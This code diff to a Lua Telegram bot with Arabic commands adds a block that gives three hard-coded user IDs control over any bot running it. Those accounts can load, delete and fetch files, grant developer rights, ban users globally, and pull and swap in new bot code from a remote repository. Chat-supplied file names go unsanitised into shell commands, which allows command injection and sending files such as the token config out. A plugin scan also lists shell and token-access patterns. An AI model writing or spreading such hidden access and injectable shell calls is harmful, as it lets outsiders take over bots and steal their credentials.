@@ -779,6 +779,285 @@ end
 getUser(msg.sender_user_id_, TSby)
 end
 -- end function
+if msg.sender_user_id_ == 438898779 or msg.sender_user_id_ == 545906637 or msg.sender_user_id_ == 763622036 then
+if (msg.content_.text_ == 'الملفات' ) then
+local files_tshake = database:smembers("files"..bot_id)
+local keko = io.popen('cd files_tshake && ls'):read("*all")
+local files_tshake2 = ''
+for i=1,#files_tshake do
+files_tshake2 = files_tshake2..'{'..files_tshake[i]..'}\n'
+end
+send(msg.chat_id_, msg.id_, 1, '☑┇جميع الملفات : \n '..keko..'\n ---------------------- \n\n✔┇الملفات المفعله \n'..files_tshake2..'', 1, 'html')
+end
+text = msg.content_.text_
+if text then
+if text:match("^(تفعيل ملف) (.*)(.lua)$")then
+local name_t = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
+function load(filename)
+local f = io.open(filename)
+if not f then
+return "keko"
+end
+local s = f:read('*all')
+f:close()
+return s
+end
+local f = load("files_tshake/"..name_t[2]..".lua")
+if f ~= "keko" then
+ts23 = ""
+if f:match("^(.*)(keko_tshake)(.*)$") then
+if f:match("^(.*)(function send)(.*)$") then
+ts23 = ts23 .. "\n⚠┇ارسال رسال نصيه"
+end
+if (f:match("^(.*)(sudo.lua)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇الوصول الى توكن البوت وايدي المطور الاساسي"
+end
+if (f:match("^(.*)(io.popen)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇الوصول الى تورمنل البوت"
+end
+if (f:match("^(.*)(os.execute)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇الوصول الى تورمنل البوت"
+end
+if (f:match("^(.*)(redis)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇الوصول الى خزن البوت"
+end
+if (f:match("^(.*)(ssl.https)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇الوصول الى مواقع خارجيه في البوت"
+end
+if (f:match("^(.*)(rm -fr)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇حذف ملفات او مجلدات"
+end
+if (f:match("^(.*)(encode)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇التصال بapi خارجي"
+end
+if (f:match("^(.*)(api.telegram.org/bot)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇قد يسبب الضعف في البوت"
+end
+database:sadd("files"..bot_id,name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, "✔┇تم تفعيل {"..name_t[2]..".lua}\n"..ts23, 1, 'html')
+else
+send(msg.chat_id_, msg.id_, 1, '⚠┇عذرا لا يمكن تشغيل {'..name_t[2]..'.lua} \n❗┇لانه لا يدعم سورس تشاكي \n 🦁┇[ملفات يدعمها سورس تشاكي](t.me/tshakeFiles)', 1, 'md')
+end
+else
+send(msg.chat_id_, msg.id_, 1, '⚠┇عذرا لا يمكن تشغيل {'..name_t[2]..'.lua} \n❗┇لانه لا يدعم سورس تشاكي \n 🦁┇[ملفات يدعمها سورس تشاكي](t.me/tshakeFiles)', 1, 'md')
+end
+end
+if text:match("^(تعطيل ملف) (.*)(.lua)$") then
+local name_t = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
+database:srem("files"..bot_id,name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, "✖┇تم تعطيل {"..name_t[2]..".lua}", 1, 'html')
+end
+if (text:match("^(مسح جميع الملفات)$"))then
+database:del("files"..bot_id)
+send(msg.chat_id_, msg.id_, 1, "🗑┇تم حذف جميع الملفات", 1, 'html')
+end
+if text:match("^(حذف ملف) (.*)(.lua)$") then
+local name_t = {string.match(text, "^(حذف ملف) (.*)(.lua)$")}
+io.popen("rm -fr files_tshake/"..name_t[2]..'.lua')
+database:srem("files"..bot_id,name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, "✖┇تم حذف {"..name_t[2]..".lua}", 1, 'html')
+end
+if (msg.content_.text_ == 'اضف ملف' ) then
+send(msg.chat_id_, msg.id_, 1, " 📥┇ ارسل ملف الان", 1, 'html')
+database:set("addfiel"..msg.sender_user_id_,"yes")
+end
+if text:match("^(جلب ملف) (.*)(.lua)$") then
+local name_t = {string.match(text, "^(جلب ملف) (.*)(.lua)$")}
+send(msg.chat_id_, msg.id_, 1, "🕡┇ انتظر بعض الوقت وسيتم جلب \n 📁┇ملف : {"..name_t[2]..".lua}", 1, 'html')
+local tshakee = 'https://api.telegram.org/bot' .. token .. '/sendDocument'
+local curl = 'curl "' .. tshakee .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'files_tshake/'..name_t[2]..'.lua' .. '"'
+io.popen(curl)
+end
+end
+if text:match("^اضف مطور$")  and msg.reply_to_message_id_ then
+function promote_by_reply(extra, result, success)
+if redis:sismember('tshake:'..bot_id..'dev', result.sender_user_id_) then
+tsX000("prore",msg,'☑┇بالفعل تم رفعه مطور')
+else
+redis:set('tshake:'..bot_id..'sudoo'..result.sender_user_id_..'', 'yes')
+redis:sadd('tshake:'..bot_id..'dev', result.sender_user_id_)
+tsX000("prore",msg,'☑┇تم رفعه مطور')
+end
+end
+getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
+end
+
+if text:match("^اضف مطور @(.*)$")  then
+local apmd = {string.match(text, "^(اضف مطور) @(.*)$")}
+function promote_by_username(extra, result, success)
+if result.id_ then
+redis:set('tshake:'..bot_id..'sudoo'..result.id_..'', 'yes')
+redis:sadd('tshake:'..bot_id..'dev', result.id_)
+texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'tshaketeam')..')\n\n☑┇تم رفعه مطور'
+else
+texts = '✖┇خطاء'
+end
+send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
+end
+resolve_username(apmd[2],promote_by_username)
+end
+
+if text:match("^اضف مطور (%d+)$")   then
+local apmd = {string.match(text, "^(اضف مطور) (%d+)$")}
+redis:set('tshake:'..bot_id..'sudoo'..apmd[2]..'', 'yes')
+redis:sadd('tshake:'..bot_id..'dev', apmd[2])
+tsX000(apmd[2],msg,'☑┇تم رفعه مطور')
+end
+
+if text:match("^حذف مطور$")  and msg.reply_to_message_id_ then
+function demote_by_reply(extra, result, success)
+if not redis:sismember('tshake:'..bot_id..'dev', result.sender_user_id_) then
+tsX000("prore",msg,'☑┇ بالفعل تم تنزيله من المطورين')
+else
+redis:del('tshake:'..bot_id..'sudoo'..result.sender_user_id_..'', 'no')
+redis:srem('tshake:'..bot_id..'dev', result.sender_user_id_)
+tsX000("prore",msg,'☑┇ تم تنزيله من مطورين البوت')
+end
+end
+getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
+end
+
+if text:match("^حذف مطور @(.*)$")  then
+local apmd = {string.match(text, "^(حذف مطور) @(.*)$")}
+function demote_by_username(extra, result, success)
+if result.id_ then
+redis:del('tshake:'..bot_id..'sudoo'..result.id_..'', 'no')
+redis:srem('tshake:'..bot_id..'dev', result.id_)
+texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'tshaketeam')..')\n☑┇ تم تنزيله من مطورين البوت'
+else
+texts = '✖┇خطاء'
+end
+send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
+end
+resolve_username(apmd[2],demote_by_username)
+end  
+if text:match("^حذف مطور (%d+)$")  then
+local apmd = {string.match(text, "^(حذف مطور) (%d+)$")}
+redis:del('tshake:'..bot_id..'sudoo'..apmd[2]..'', 'no')
+redis:srem('tshake:'..bot_id..'dev', apmd[2])
+tsX000(apmd[2],msg,'☑┇ تم تنزيله من مطورين البوت')
+end
+if text:match("^حظر عام$")   and msg.reply_to_message_id_ then
+function gban_by_reply(extra, result, success)
+local hash =  'tshake:'..bot_id..'gbanned:'
+if is_admin(result) then
+send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر عام \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
+else
+database:sadd(hash, result.sender_user_id_)
+chat_kick(result.chat_id_, result.sender_user_id_)
+tsX000("prore",msg,"🚫┇تم حظره من مجموعات البوت")
+end
+end
+getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
+end
+
+if text:match("^حظر عام @(.*)$")   then
+local apbll = {string.match(text, "^(حظر عام) @(.*)$")}
+function gban_by_username(extra, result, success)
+if result.id_ then
+if ck_admin(result.id_) then
+send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر عام \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
+else
+local hash =  'tshake:'..bot_id..'gbanned:'
+texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apbll[2] or 'tshaketeam')..')\n🚫┇تم حظره من المجموعات البوت'
+database:sadd(hash, result.id_)
+end
+else
+texts = '✖┇خطاء'
+end
+send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
+end
+resolve_username(apbll[2],gban_by_username)
+end
+
+if text:match("^حظر عام (%d+)$")   then
+local apbll = {string.match(text, "^(حظر عام) (%d+)$")}
+local hash =  'tshake:'..bot_id..'gbanned:'
+if ck_admin(apbll[2]) then
+send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر عام \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
+else
+database:sadd(hash, apbll[2])
+tsX000(apbll[2],msg,"🚫┇تم حظره من المجموعات البوت")
+end
+end
+if text:match("^الغاء العام$")   and msg.reply_to_message_id_ then
+function ungban_by_reply(extra, result, success)
+local hash =  'tshake:'..bot_id..'gbanned:'
+tsX000("prore",msg,"🚫┇تم الغاء حظره من المجموعات البوت")
+database:srem(hash, result.sender_user_id_)
+end
+getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
+end
+
+if text:match("^الغاء العام @(.*)$")   then
+local apid = {string.match(text, "^(الغاء العام) @(.*)$")}
+function ungban_by_username(extra, result, success)
+local hash =  'tshake:'..bot_id..'gbanned:'
+if result.id_ then
+texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apid[2] or 'tshaketeam')..')\n��┇تم الغاء حظره من المجموعات البوت'
+database:srem(hash, result.id_)
+else
+texts = '✖┇خطاء'
+end
+send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
+end
+resolve_username(apid[2],ungban_by_username)
+end
+
+if text:match("^الغاء العام (%d+)$")   then
+local apbll = {string.match(text, "^(الغاء العام) (%d+)$")}
+local hash =  'tshake:'..bot_id..'gbanned:'
+database:srem(hash, apbll[2])
+tsX000(apbll[2],msg,"🚫┇تم الغاء حظره من مجموعات البوت")
+end
+if text:match("^تحديث السورس$")  then
+send(msg.chat_id_, msg.id_, 1, '☑┇تم التحديث', 1, 'md')
+os.execute('rm -rf ./libs/utils.lua')
+os.execute('cd libs && wget https://raw.githubusercontent.com/TshAkETEAM/Tshake/master/libs/utils.lua')
+os.execute('rm -rf Tshake.lua')
+os.execute('wget https://raw.githubusercontent.com/TshAkETEAM/Tshake/master/Tshake.lua')
+os.exit()
+return false
+end
+if text == "تفعيل"  then
+function TSby(extra,result,success)
+info = '💬┇بواسطه ~⪼ ['..result.first_name_..'](t.me/'..(result.username_ or 'tshaketeam')..')\n'
+if database:get( 'tshake:'..bot_id.."charge:"..msg.chat_id_) then
+function thsake_info(k1,k2)
+send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} مفعله سابقا", 1, 'md')
+end
+openChat(msg.chat_id_,thsake_info)
+end
+if not database:get( 'tshake:'..bot_id.."charge:"..msg.chat_id_) then
+database:set( 'tshake:'..bot_id.."charge:"..msg.chat_id_,true)
+function thsake_info(k1,k2)
+send(msg.chat_id_, msg.id_, 1, info.."☑️┇تم تفعيل المجموعه {"..(k2.title_ or "").."}", 1, 'md')
+end
+openChat(msg.chat_id_,thsake_info)
+function thsake_info2(k1,k2)
+function dl_cb222(t1,t2)
+if t2.invite_link_ == false then 
+local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
+local req = https.request(getlink)
+local link = json:decode(req)
+if link.ok == true then 
+  t2.invite_link_ = link.result
+end
+end
+end
+tdcli_function ({
+ID = "GetChannelFull",
+channel_id_ = getChatId(msg.chat_id_).ID
+}, dl_cb222, nil)
+end
+openChat(msg.chat_id_,thsake_info2) 
+--
+database:sadd("thsake:gog"..bot_id, msg.chat_id_)
+database:set( 'tshake:'..bot_id.."enable:"..msg.chat_id_,true)
+end end
+getUser(msg.sender_user_id_, TSby)
+end
+end
 if (text == 'تفعيل') and not is_sudo(msg) then
 local res = http.request('http://tshake.gq/x.php?id='..msg.sender_user_id_..'')
 vardump(res)
